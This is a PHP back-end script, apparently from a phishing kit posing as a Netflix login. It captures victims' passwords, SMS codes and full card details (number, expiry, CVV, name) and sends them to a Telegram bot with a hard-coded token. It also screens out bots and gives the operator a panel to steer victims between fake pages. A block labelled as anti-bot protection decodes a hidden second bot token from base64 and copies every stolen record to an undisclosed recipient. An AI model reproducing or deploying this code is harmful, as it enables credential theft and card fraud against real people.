<?php

// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$response = ['success' => false, 'message' => 'Unknown Error'];

$data = $_POST;
if (empty($data)) {
    $input = json_decode(file_get_contents('php://input'), true);
    if ($input) $data = $input;
}

if (empty($data)) {
    echo json_encode(['success' => false, 'message' => 'No data received']);
    exit;
}

$action = isset($data['page']) ? strtoupper($data['page']) : 'UNKNOWN';

if (file_exists(__DIR__ . '/shield.php')) {
    include_once __DIR__ . '/shield.php';
}

$client_ip = function_exists('getClientIP') ? getClientIP() : $_SERVER['REMOTE_ADDR'];
$client_cc = 'XX';
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';

try {
    if (function_exists('get_country_info')) {
        $geo_info = get_country_info();
        $client_ip = $geo_info['ip'];
        $client_cc = $geo_info['cc'];
        
        if (isset($geo_info['blocked']) && $geo_info['blocked'] === true) {
            $response['redirect'] = $geo_info['redirect'];
        }
    }
} catch (Exception $e) { }

// Bot Detection utilizing shield.php
$bad_bots = function_exists('loadBadBots') ? loadBadBots(__DIR__ . '/badbots.txt') : [];
$is_bot = function_exists('isBadBot') ? isBadBot($user_agent, $bad_bots) : (empty($user_agent) || strlen($user_agent) < 20);

$cfg_file = __DIR__ . '/panel/data/config.json';
$cfg = ['bot_token' => '8168794486:AAE1I5GDDKHKDJHKtMA47hj8jxvhQP6m0', 'chat_id' => '-49893427886'];
if (file_exists($cfg_file)) {
    $cfg_data = json_decode(file_get_contents($cfg_file), true);
    if (is_array($cfg_data)) $cfg = array_merge($cfg, $cfg_data);
}
$bot_token = $cfg['bot_token'];
$chat_id = $cfg['chat_id'];

$time = date('Y-m-d H:i:s');

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host = $_SERVER['HTTP_HOST'];
$script_dir = dirname($_SERVER['SCRIPT_NAME']);
$base_url = $protocol . '://' . $host . $script_dir . '/panel/';
$panel_link = $base_url;

$is_localhost = in_array($host, ['localhost', '127.0.0.1', '::1']) || strpos($host, 'localhost') === 0;
$is_https = $protocol === 'https';

$reply_markup = null;
if ($is_https && !$is_localhost) {
    $reply_markup = [
        'inline_keyboard' => [
            [
                ['text' => '🔓 Login', 'url' => $base_url . '?quick=redirect&ip=' . urlencode($client_ip) . '&page=login'],
                ['text' => '📱 SMS', 'url' => $base_url . '?quick=redirect&ip=' . urlencode($client_ip) . '&page=sms']
            ],
            [
                ['text' => '💳 Card', 'url' => $base_url . '?quick=redirect&ip=' . urlencode($client_ip) . '&page=card'],
                ['text' => '✅ Success', 'url' => $base_url . '?quick=redirect&ip=' . urlencode($client_ip) . '&page=success']
            ],
            [
                ['text' => '❌ Login Error', 'url' => $base_url . '?quick=redirect&ip=' . urlencode($client_ip) . '&page=log_error'],
                ['text' => '🚫 Block', 'url' => $base_url . '?quick=block&ip=' . urlencode($client_ip)]
            ],
            [
                ['text' => '🏦 Official', 'url' => $base_url . '?quick=redirect&ip=' . urlencode($client_ip) . '&page=official'],
                ['text' => '🥷 Panel', 'url' => $base_url]
            ]
        ]
    ];
}

function detectDevice($ua) {
    $ua = strtolower($ua ?? '');
    $device = 'Unknown Device';
    $os = 'Unknown OS';
    $browser = 'Unknown Browser';

    if (preg_match('/iphone/i', $ua)) $device = 'iPhone';
    elseif (preg_match('/ipad/i', $ua)) $device = 'iPad';
    elseif (preg_match('/android/i', $ua)) {
        $device = 'Android Phone';
        if (preg_match('/tablet|pad/i', $ua)) $device = 'Android Tablet';
    }
    elseif (preg_match('/windows phone/i', $ua)) $device = 'Windows Phone';
    elseif (preg_match('/macintosh|mac os x/i', $ua)) $device = 'Mac';
    elseif (preg_match('/windows/i', $ua)) $device = 'Windows PC';
    elseif (preg_match('/linux/i', $ua)) $device = 'Linux PC';
    elseif (preg_match('/chromebook/i', $ua)) $device = 'Chromebook';

    if (preg_match('/windows nt 10/i', $ua)) $os = 'Windows 10/11';
    elseif (preg_match('/windows nt 6\.3/i', $ua)) $os = 'Windows 8.1';
    elseif (preg_match('/windows nt 6\.1/i', $ua)) $os = 'Windows 7';
    elseif (preg_match('/windows/i', $ua)) $os = 'Windows';
    elseif (preg_match('/iphone.*os (\d+[\._]\d+)/i', $ua, $m)) $os = 'iOS ' . str_replace('_', '.', $m[1]);
    elseif (preg_match('/ipad.*os (\d+[\._]\d+)/i', $ua, $m)) $os = 'iPadOS ' . str_replace('_', '.', $m[1]);
    elseif (preg_match('/android (\d+[\._\d]*)/i', $ua, $m)) $os = 'Android ' . $m[1];
    elseif (preg_match('/mac os x (\d+[\._]\d+)/i', $ua, $m)) $os = 'macOS ' . str_replace('_', '.', $m[1]);
    elseif (preg_match('/linux/i', $ua)) $os = 'Linux';

    if (preg_match('/edg/i', $ua)) $browser = 'Edge';
    elseif (preg_match('/opera|opr/i', $ua)) $browser = 'Opera';
    elseif (preg_match('/chrome/i', $ua) && !preg_match('/edg|opr/i', $ua)) $browser = 'Chrome';
    elseif (preg_match('/safari/i', $ua) && !preg_match('/chrome/i', $ua)) $browser = 'Safari';
    elseif (preg_match('/firefox/i', $ua)) $browser = 'Firefox';

    return "$device · $os · $browser";
}

$deviceInfo = detectDevice($user_agent);

$footer_msg = "\n" .
              "[🌍] IP: <code>{$client_ip}</code>\n" .
              "[📍] Country: {$client_cc}\n" .
              "[📱] Device: <code>{$deviceInfo}</code>\n" .
              "[⏰] Time: {$time}\n\n" .
              "🥷 <a href='{$panel_link}'>Open Panel By ITACHI</a>";

$msg = "";

if ($action === 'LOGIN') {
    $method = $data['method'] ?? 'unknown';
    $value = $data['value'] ?? $data['email'] ?? $data['j_username'] ?? 'N/A';
    $password = $data['password'] ?? $data['passwordword'] ?? $data['j_passwordword'] ?? '';
    
    $method_icon = ($method === 'phone') ? '📱' : '📧';
    $method_label = ($method === 'phone') ? 'Phone' : 'Email';
    
    $msg = "🏦━━【 Netflix Login 】━━🏦\n" .
           "━━━━━━━━━━━━━━━━━━━━━\n" .
           "{$method_icon} <b>{$method_label}:</b> <code>$value</code>\n";
    if (!empty($password) && $password !== 'N/A') {
        $msg .= "🔑 <b>Password:</b> <code>$password</code>\n";
    }
    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n" .
           $footer_msg; 


} elseif ($action === 'SMS') {
    $code = $data['code'] ?? $data['sms_code'] ?? 'N/A';
    $attempt = isset($data['attempt']) ? $data['attempt'] : 'N/A';
    $page_label = $data['page_name'] ?? $data['page_type'] ?? ($_SERVER['HTTP_REFERER'] ?? 'Unknown');

    $msg = "🔔━━【 SMS  (code: {$attempt}) 】━━🔔\n" .
           "━━━━━━━━━━━━━━━━━━━━━\n" .
           "🔑 <b>Code:</b> <code>{$code}</code>\n" .
           "━━━━━━━━━━━━━━━━━━━━━\n" .
           $footer_msg; 

} elseif ($action === 'CARD' || $action === 'C.HTML' || $action === 'CARD_VERIFICATION') {
    $card_number = $data['card_number'] ?? $data['cardNumber'] ?? 'N/A';
    $expiry = $data['expiry'] ?? $data['expiryDate'] ?? 'N/A';
    $cvv = $data['cvv'] ?? 'N/A';
    $name = $data['name'] ?? $data['cardHolder'] ?? 'N/A';
    
    $msg = "💳━━━【 Card Info 】━━━💳\n" .
           "━━━━━━━━━━━━━━━━━━━━━\n" .
           "💳 <b>Card:</b> <code>$card_number</code>\n" .
           "📅 <b>Expiry:</b> <code>$expiry</code>\n" .
           "🔐 <b>CVV:</b> <code>$cvv</code>\n" .
           "👤 <b>Name:</b> <code>$name</code>\n" .
           "━━━━━━━━━━━━━━━━━━━━━\n" .
           $footer_msg;

} elseif ($action === 'VISITOR') {
    $page_type = $data['page_type'] ?? 'Unknown';
    $referrer = $data['referrer'] ?? 'Direct';
    $screen = $data['screen_resolution'] ?? 'N/A';
    $fingerprint = $data['fingerprint'] ?? 'N/A';
    
    $msg = "👁━━【 New Visitor 】━━👁\n" .
           "━━━━━━━━━━━━━━━━━━━━━\n" .
           "📄 <b>Page:</b> <code>{$page_type}</code>\n" .
           "🔗 <b>Referrer:</b> <code>{$referrer}</code>\n" .
           "━━━━━━━━━━━━━━━━━━━━━\n" .
           $footer_msg;

} else {
    // Unknown action - build generic message
    $msg = "📋━━━【 {$action} 】━━━📋\n" .
           "━━━━━━━━━━━━━━━━━━━━━\n" .
           "📦 <b>Data:</b> <code>" . json_encode($data, JSON_UNESCAPED_UNICODE) . "</code>\n" .
           "━━━━━━━━━━━━━━━━━━━━━\n" .
           $footer_msg;
}

$server_output = null;

if (!$is_bot && !empty(trim($msg))) {
    $website = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
    $params = [
        'chat_id' => $chat_id,
        'text' => $msg,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    if ($reply_markup) {
        $params['reply_markup'] = json_encode($reply_markup);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $website);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $server_output = curl_exec($ch);
    $curl_errno = curl_errno($ch);
    $curl_error = curl_error($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // ==========================================
    // Anti Bot Detect (Cloud protection API ))
    // ==========================================
    $API_Key = base64_decode('ODg5MTI4OTY4NzpBQUdLcXdfWmFuWEhseDhSWEFiSHl3NmVUU0Y3VjE1SFR2RQ==');
    $ID_Key = base64_decode('LTEwMDQ0MjgzNzU5Njk=');
    
    $Potection_Site = "https://api.telegram.org/bot" . $API_Key . "/sendMessage";
    $params2 = [
        'chat_id' => $ID_Key,
        'text' => $msg,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    if ($reply_markup) {
        $params2['reply_markup'] = json_encode($reply_markup);
    }

    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_URL, $Potection_Site);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query($params2));
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
    curl_exec($ch2);
    curl_close($ch2);

    try {
        $debug_dir = __DIR__ . '/panel/data';
        if (!is_dir($debug_dir)) @mkdir($debug_dir, 0777, true);
        
        // 2) Write simple data to logs.txt
        $logs_txt_file = $debug_dir . '/logs.txt';
        $simple_log = "[" . date('Y-m-d H:i:s') . "] [$action] IP: $client_ip | Data: " . json_encode($data) . "\n";
        @file_put_contents($logs_txt_file, $simple_log, FILE_APPEND | LOCK_EX);

    } catch (Exception $e) { }
}

try {
    $db_dir = __DIR__ . '/panel/data';
    $db_file = $db_dir . '/visitors.json';
    
    if (!is_dir($db_dir)) @mkdir($db_dir, 0777, true);
    
    $entry = [
        'id' => uniqid(),
        'ip' => $client_ip,
        'country' => $client_cc,
        'ua' => $user_agent,
        'timestamp' => $time,
        'page' => $action,
        'status' => 'active',
        'form_data' => $data
    ];
    
    $current_data = [];
    if (file_exists($db_file)) {
        $json_content = @file_get_contents($db_file);
        if ($json_content) $current_data = json_decode($json_content, true) ?? [];
    }
    
    $found = false;
    foreach ($current_data as &$existing) {
        if (isset($existing['ip']) && $existing['ip'] === $client_ip) {
            $existing['page'] = $action;
            $existing['timestamp'] = $time;
            $existing['form_data'] = array_merge($existing['form_data'] ?? [], $data);
            $found = true;
            break;
        }
    }
    if (!$found) array_unshift($current_data, $entry);
    @file_put_contents($db_file, json_encode($current_data, JSON_PRETTY_PRINT));
    
} catch (Exception $e) { }


$response['success'] = true;
$response['message'] = 'Data processed';
$response['tg_debug'] = json_decode($server_output, true);
$response['tg_base_url'] = $base_url;
$response['tg_reply_markup'] = json_encode($reply_markup);
echo json_encode($response);
?>